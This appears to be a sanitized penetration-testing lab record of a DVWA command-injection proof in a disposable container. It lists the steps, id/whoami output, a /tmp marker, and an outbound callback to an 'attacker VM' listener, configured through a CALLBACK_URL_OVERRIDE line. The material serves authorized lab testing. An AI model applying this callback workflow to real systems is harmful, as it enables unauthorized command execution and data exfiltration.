> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# verified_lab_flow_dvwa_command_injection_true_attacker_callback

Status: verified-impact / local-lab only
Date: 2026-05-22

## Pattern

DVWA low-security command injection can be used as a single-vulnerability max-impact lab proof:

1. Authenticate to disposable DVWA container.
2. Set security level low.
3. Inject a bounded command into `/vulnerabilities/exec/`.
4. Prove server-side OS command execution with `id` / `whoami`.
5. Write/read a lab marker under `/tmp`.
6. Trigger outbound HTTP callback to attacker VM listener.
7. Save command-response and callback-listener artifacts.
8. Remove disposable containers and close temporary NAT if used for setup.

## Verified run

Artifact root:

`<artifact-output-dir>/dvwa_cmdinj_impact_wave1_20260522T061407Z/`

Command execution excerpt:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
DVWA_CMDINJ_dvwa_cmdinj_impact_wave1_20260522T061407Z
```

Attacker callback excerpt:

```json
{"ts":"2026-05-22T06:14:12+00:00","remote":"<lab-ip>","query":"marker=DVWA_CMDINJ_dvwa_cmdinj_impact_wave1_20260522T061407Z","ua":"","path":"/callback.php?marker=DVWA_CMDINJ_dvwa_cmdinj_impact_wave1_20260522T061407Z"}
```

## Route

- Historical artifact label: `<attacker-vm>` / `<lab-ip>`
- Current attacker route for future reruns: `<attacker-vm>` / `<lab-ip>`
- Callback listener: Docker-published `php:8.2-apache`, `<lab-ip>:18182 -> 80`
- Victim VM: `<victim-vm>` / `<lab-ip>`
- Target: disposable `vulnerables/web-dvwa:latest`, `<lab-ip>:18080 -> 80`

## Standard evidence packet

Use `handoff/dvwa_attacker_callback_evidence_packet_standard_20260523.md` as the canonical packet/checklist for this proof pattern before adapting it to SSRF, XXE, deserialization, or another callback-dependent lane. It records the route normalization to `<attacker-vm>`, the external-callback-log caveat, the report-readiness decision, and the rerun gate.

## Boundaries

- Local authorized lab only.
- Marker-only payload.
- No persistence.
- No credential theft.
- No destructive OS action.
- No public C2.

## Reuse notes

- `<attacker-vm>` now has Docker runtime installed.
- Use `CALLBACK_URL_OVERRIDE="http://<lab-ip>:18182/callback.php?marker=__MARKER__"` for the runner.
- Use `USE_LOCAL_CALLBACK_LISTENER=0` when a Docker-published listener owns the callback port.
- If a new listener image is needed, reopen a temporary NAT setup window and close it after pulling.
